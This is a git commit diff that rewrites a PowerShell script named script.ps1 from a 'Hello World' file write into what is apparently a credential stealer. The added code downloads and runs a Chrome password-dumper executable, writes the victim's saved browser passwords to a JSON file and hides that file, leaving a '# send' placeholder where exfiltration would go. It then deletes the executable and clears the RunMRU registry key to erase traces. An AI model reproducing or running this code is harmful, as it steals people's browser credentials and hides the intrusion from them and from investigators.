16e13e3a63cb0eb50773317ecceb47cfd09c17b8
M3601 <41511838+M3601@users.noreply.github.com>
2022-01-31 11:43:10 +0100

    Update script.ps1

--- script.ps1
+++ script.ps1
@@ -1,2 +1,18 @@
 $username = $env:UserName;
-$text = 'Hello World!' | Out-File $text -FilePath C:\Users\$username\Desktop\hello.txt
+$url = "https://github.com/BudiNverse/chrome-pwd-dumper-rs/releases/download/0.3.0/chrome-pwd-dumper.exe";
+$path = "C:\Users\{0}\AppData\Roaming\cpd.exe" -f $username;
+$cmd = "{0} -f json x" -f $path;
+Invoke-WebRequest -Uri $url -OutFile $path;
+Invoke-Expression $cmd;
+Remove-Item $path;
+Set-ItemProperty -Path .\x.json -Name attributes -Value 6;
+# send
+Set-ItemProperty -Path .\x.json -Name attributes -Value 0;
+# Remove-Item x.json
+
+$path = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU";
+$arr = Get-ItemPropertyValue $path -Name MRUList;
+Set-ItemProperty -Path $path -Name MRUList -Value "";
+foreach ($x in $arr.ToCharArray()) {
+    Remove-ItemProperty -Path $path -Name $x;
+}
